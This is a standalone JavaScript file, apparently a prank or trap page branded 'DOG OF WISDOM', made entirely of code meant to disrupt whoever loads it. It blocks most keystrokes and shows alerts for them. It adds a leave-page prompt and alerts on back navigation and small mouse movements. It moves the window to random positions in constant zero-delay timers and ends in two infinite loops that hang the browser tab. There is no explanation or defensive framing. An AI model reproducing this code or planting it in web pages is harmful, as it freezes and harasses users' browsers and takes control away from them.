document.onkeydown=function(e){
  var k=e.keyCode||e.which;
  if(
    (k>=32&&k<=40)||k===13||
    (k>=65&&k<=90)||(k>=97&&k<=122)||
    k===179||k===178||
    (k>=96&&k<=105)||(k>=112&&k<=123)||(k>=186&&k<=222)
  ){
    alert('DOG OF WISDOM KEY BLOCKED!\nKEY CODE: '+k);
    if(e.preventDefault)e.preventDefault();
    return false;
  }
  return true;
};
window.onbeforeunload=function(e){var m="DOG OF WISDOM!";if(e)e.returnValue=m;return m;};
window.addEventListener("popstate",function(){alert("DOG OF WISDOM!");});
(function(){var lX=null,lY=null,mC=0,lT=Date.now(),t=10,mI=1000;document.onmousemove=function(e){var x=e.clientX,y=e.clientY;if(lX!==null&&lY!==null){var dx=Math.abs(x-lX),dy=Math.abs(y-lY),d=Math.sqrt(dx*dx+dy*dy),n=Date.now();if(d<t&&(n-lT)<mI){mC++;}else{mC=0;}lT=n;if(mC>5){alert("DOG OF WISDOM!");mC=0;}}lX=x;lY=y;};})();
window.lolWUT_XD=(function lolWUT_XD(){
  try{
    var w=screen.availWidth,h=screen.availHeight;
    window.moveTo(Math.random()*w,Math.random()*h);
    window.moveBy(Math.random()*100-50,Math.random()*100-50);
  }catch(e){}
  setTimeout('(0,lolWUT_XD)()',0);
  return lolWUT_XD;
})();
setInterval('window["lolWUT_XD"]()',0);
setInterval('try{var w=screen.availWidth,h=screen.availHeight;window.moveTo(Math.random()*w,Math.random()*h);window.moveBy(Math.random()*100-50,Math.random()*100-50);}catch(e){}',0);
window.addEventListener('focus',function(){window["lolWUT_XD"]()});
window.addEventListener('mousemove',function(){window["lolWUT_XD"]()});
window.addEventListener('load',function(){window["lolWUT_XD"]()});
(function(){
  try{
    for(;;){
      var w=screen.availWidth,h=screen.availHeight;
      window.moveTo(Math.random()*w,Math.random()*h);
      window.moveBy(Math.random()*100-50,Math.random()*100-50);
    }
  }catch(e){}
})();
(function loop(){
  try{
    while(true){
      var w=screen.availWidth,h=screen.availHeight;
      window.moveTo(Math.random()*w,Math.random()*h);
      window.moveBy(Math.random()*100-50,Math.random()*100-50);
    }
  }catch(e){}
})();
